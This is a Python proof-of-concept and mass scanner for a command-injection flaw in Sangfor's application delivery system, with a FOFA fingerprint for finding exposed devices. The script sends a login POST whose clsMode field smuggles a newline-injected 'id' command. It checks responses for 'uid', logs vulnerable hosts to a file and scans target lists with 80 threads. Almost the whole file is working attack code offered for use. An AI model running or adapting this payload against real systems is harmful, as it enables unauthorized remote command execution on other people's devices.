# 深信服应用交付系统命令执行漏洞
# FOFA: fid=“iaytNA57019/kADk8Nev7g==”

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def denner():
    test = """
\x1b[38m██╗      ██████╗  ██████╗ ██╗███╗   ██╗        ██████╗  ██████╗███████╗
\x1b[36m██║     ██╔═══██╗██╔════╝ ██║████╗  ██║        ██╔══██╗██╔════╝██╔════╝
\x1b[34m██║     ██║   ██║██║  ███╗██║██╔██╗ ██║        ██████╔╝██║     █████╗  
\x1b[35m██║     ██║   ██║██║   ██║██║██║╚██╗██║        ██╔══██╗██║     ██╔══╝  
\x1b[31m███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║███████╗██║  ██║╚██████╗███████╗
\x1b[33m╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝
                                            --author:Kucei
                                            --Version:深信服应用交付系统命令执行漏洞 1.0.0     
\x1b[0m"""
    print(test)

def main():
    denner()
    # 初始化
    parser = argparse.ArgumentParser("深信服应用交付系统命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/rep/login"
    headers = {
        'Content-Length':'118',
        'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    data = "clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+url_payload,headers=headers,data=data,proxies=proxies,verify=False,timeout=5)
        # 匹配条件
        if res1.status_code == 200 and 'uid' in res1.text:
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
                print('\x1b[31m[+]\x1b[0m'+target+url_payload+'存在漏洞')
        else:
            print('[-]'+target+'不存在漏洞')
    except Exception:
        print(f":{target}--请求时出错--")

if __name__ == '__main__':
    main()